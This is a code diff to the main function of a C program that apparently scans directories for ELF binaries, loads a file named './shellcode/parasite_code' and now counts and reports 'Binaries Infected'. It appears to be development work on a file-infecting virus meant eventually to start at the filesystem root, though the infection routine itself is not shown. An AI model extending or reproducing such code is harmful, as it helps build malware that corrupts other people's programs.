@@ -47,19 +47,18 @@ int main(int argc, char *argv[])
 
 	
 	// setting parasite_path to argv[2]
-	//parasite_path = argv[2];
-	parasite_path = "./shellcode/parasite_code";
-	
+	// parasite_path = argv[2];
+	parasite_path  = "./shellcode/parasite_code";
+	infected_count = 0;
+
 
 	// Get the real and effective user IDs and check if user has root priveleges
 	uid_t uid = getuid();
 	uid_t euid = geteuid();
-	
 	if (uid == 0 || euid == 0)
 		fprintf(stdout, GREEN"\n[+] "RESET"Running as root : %d : %d ...\n", uid, euid);
 	else
 		fprintf(stdout, RED"\n[-] "RESET"Running as %s ...\n", getenv("USERNAME"));
-
 
 
     char *path = argv[1];         // Replace it with ROOTNODE when done developing
@@ -74,10 +73,10 @@ int main(int argc, char *argv[])
 	Destroy(head);
 
 	fprintf(stdout, "\n\n\n");
-	fprintf(stdout, BOLDGREEN"[+]"RESET" Parsed %ld directories\n", dir_count);
-	fprintf(stdout, BOLDGREEN"[+]"RESET" Parsed %ld files\n", file_count);
-	fprintf(stdout, BOLDGREEN"[+]"RESET" Parsed %ld ELFs\n", elf_count);
-
+	fprintf(stdout, BOLDGREEN"[+]"RESET" Total Directories  Parsed   : %ld\n", dir_count);
+	fprintf(stdout, BOLDGREEN"[+]"RESET" Total files        Parsed   : %ld\n", file_count);
+	fprintf(stdout, BOLDGREEN"[+]"RESET" Total ELFs         Parsed   : %ld\n", elf_count);
+	fprintf(stdout, BOLDCYAN"[+]"RESET" Total Binaries     Infected : %d \n", infected_count); 
 	
 
 return 0x00;
